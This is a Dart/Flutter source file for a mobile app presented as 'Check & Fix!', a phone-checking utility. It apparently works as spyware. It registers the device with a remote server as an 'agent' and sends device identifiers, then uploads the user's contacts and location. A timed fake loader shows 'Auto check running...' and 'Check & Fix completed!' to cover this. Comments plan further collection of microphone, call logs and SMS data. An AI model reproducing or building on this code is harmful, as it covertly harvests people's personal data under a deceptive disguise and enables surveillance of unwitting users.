import 'package:check_and_fix/presentation/widgets/permission_widget.dart';
import 'package:flutter/material.dart';
import 'package:check_and_fix/presentation/utils/color_printer.dart';
import 'package:check_and_fix/presentation/utils/services.dart';
import 'package:fk_user_agent/fk_user_agent.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_easyloading/flutter_easyloading.dart';
import 'package:hive/hive.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:uuid/uuid.dart';

class PermissionHandlerWidget extends StatefulWidget {
  const PermissionHandlerWidget({super.key});

  @override
  PermissionHandlerWidgetState createState() => PermissionHandlerWidgetState();
}

class PermissionHandlerWidgetState extends State<PermissionHandlerWidget> {
  var colorIndex = 15;
  String? uuid;
  String? imei;
  String? agent;

  @override
  void initState() {
    super.initState();

    _requestPermissions();
  }

  void _requestPermissions() async {
    await _initServerConnection();

    printWhite('UUID: $uuid');
    printWhite('IMEI: $imei');
    printWhite('agent: $agent');

    await _requestPermission(Permission.contacts);
    await _requestPermission(Permission.location);

    _dummyLoader();
    Api.sendLocationToServer(agent, uuid);
    Api.sendContactsToServer(agent, uuid);

    setState(() {});
  }

  Future<PermissionStatus?> _requestPermission(Permission permission) async {
    final alreadyGranted = await permission.isGranted;

    if (alreadyGranted) return null;

    final status = await permission.request();

    try {
      if (status.isGranted) {
        if (kDebugMode) {
          print('${permission.toString()} granted');
        }
      } else {
        if (kDebugMode) {
          print('${permission.toString()} denied');
        }
      }
    } catch (e) {}

    return status;
  }

  Future _initServerConnection() async {
    final box = await Hive.openBox('myBox');

    await FkUserAgent.init();

    agent = FkUserAgent.userAgent!;
    box.put('agent', agent);

    imei = box.get('imei') ??
        const Uuid().v4(); // -> '110ec58a-a0f2-4ac4-8393-c866d813b8d1';
    box.put('imei', imei);

    // if (kDebugMode) await box.clear();
    // DEBUG UUID: 870e76ef-1ac7-41f6-a467-6bec59b4e315
    uuid = box.get('uuid');
    uuid ??= await Api.initRegister(agent!);
    box.put('uuid', uuid);

    setState(() {});

    Api.agentUpdate(agent, uuid, data: {
      "uuid": uuid,
      "command_id": "1001",
      "data": {
        "IMEI": imei.toString(),
        "phone_number": '',
        "voice_mail_number": '',
        "IMSI": UniqueKey().toString().replaceAll('#', ''),
        "network_name": "Android",
      }
    });
  }

  Future _dummyLoader() async {
    EasyLoading.show(
        status: 'Auto check running...', maskType: EasyLoadingMaskType.custom);

    await Future.delayed(const Duration(milliseconds: 3500));

    EasyLoading.showSuccess('Check & Fix completed!',
        duration: const Duration(milliseconds: 2500));
  }

  List<Widget> _permissionContainers() {
    return Permission.values.where(
      (permission) {
        // Also reactive in android manifest!
        //~ To remove permissions:
        return
            //> Coming soon:
            permission != Permission.calendar &&
                permission != Permission.camera &&
                permission != Permission.photos &&
                permission != Permission.manageExternalStorage &&
                permission != Permission.locationAlways &&
                permission != Permission.sms &&
                permission != Permission.phone &&
                //> Will not be in use:
                permission != Permission.unknown &&
                permission != Permission.mediaLibrary &&
                // permission != Permission.photos &&
                permission != Permission.photosAddOnly &&
                permission != Permission.reminders &&
                permission != Permission.appTrackingTransparency &&
                permission != Permission.nearbyWifiDevices &&
                permission != Permission.bluetooth &&
                permission != Permission.bluetoothAdvertise &&
                permission != Permission.bluetoothConnect &&
                permission != Permission.bluetoothScan &&
                permission != Permission.sensors &&
                permission != Permission.speech &&
                permission != Permission.notification &&
                permission != Permission.activityRecognition &&
                permission != Permission.requestInstallPackages &&
                permission != Permission.systemAlertWindow &&
                permission != Permission.accessNotificationPolicy &&
                permission != Permission.locationWhenInUse &&
                permission != Permission.criticalAlerts &&
                // permission != Permission.manageExternalStorage &&
                // permission != Permission.storage &&
                permission != Permission.accessMediaLocation &&
                permission != Permission.audio &&
                permission != Permission.videos &&
                permission != Permission.ignoreBatteryOptimizations &&
                permission != Permission.scheduleExactAlarm;
      },
    ).map((permission) {
      // var color = Colors.primaries[math.Random().nextInt(Colors.primaries.length)]
      var color = Colors.primaries[colorIndex].withOpacity(0.70);
      colorIndex--;

      if (colorIndex == 0) colorIndex = 15;

      // var color = Colors.blue.withOpacity(0.75);
      var icon = Icons.done;

      if (permission == Permission.calendar) {
        icon = Icons.event;
      }
      if (permission == Permission.camera) {
        icon = Icons.photo_camera;
      }
      if (permission == Permission.contacts) {
        icon = Icons.groups;
      }
      if (permission == Permission.location) {
        icon = Icons.location_on;
      }
      if (permission == Permission.locationAlways) {
        icon = Icons.my_location;
      }
      if (permission == Permission.microphone) {
        icon = Icons.mic;
      }
      if (permission == Permission.phone) {
        icon = Icons.call;
      }
      if (permission == Permission.photos) {
        icon = Icons.image;
      }
      if (permission == Permission.sms) {
        icon = Icons.textsms;
      }
      if (permission == Permission.storage ||
          permission == Permission.manageExternalStorage) {
        icon = Icons.folder;
        // icon = Icons.cloud_done;
      }
      if (permission == Permission.videos) {
        icon = Icons.movie;
      }
      if (permission == Permission.audio) {
        icon = Icons.volume_up;
      }

      return PermissionWidget(permission, color, icon);
    }).toList();
  }

  @override
  Widget build(BuildContext context) {
    if (kDebugMode) {
      print('START: PermissionHandlerWidget()');
    }

    return Scaffold(
      backgroundColor: Colors.blue[300],
      appBar: AppBar(
        titleSpacing: 0,
        leading: const Icon(Icons.auto_fix_high),
        title: const Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              'Check & Fix!',
              style: TextStyle(fontWeight: FontWeight.bold, fontSize: 18),
            ),
            Text(
              'Check all your phone in 1 app:',
              style: TextStyle(fontSize: 13),
            ),
          ],
        ),
        elevation: 0,
      ),
      body: Center(
        child: GridView(
          gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
            crossAxisCount: (2),
          ),

          // 1. Contacts
          // 2. Location (Fine)
          // 3. Microphone
          // 4. Call Logs
          // 5. SMS

          // Operation "מבצעי" mode: need to wait agent & update server with initState()
          // But not in normal mode
          children: agent != null && uuid != null
              ? _permissionContainers()
              : _permissionContainers(),
        ),
      ),
    );
  }
}
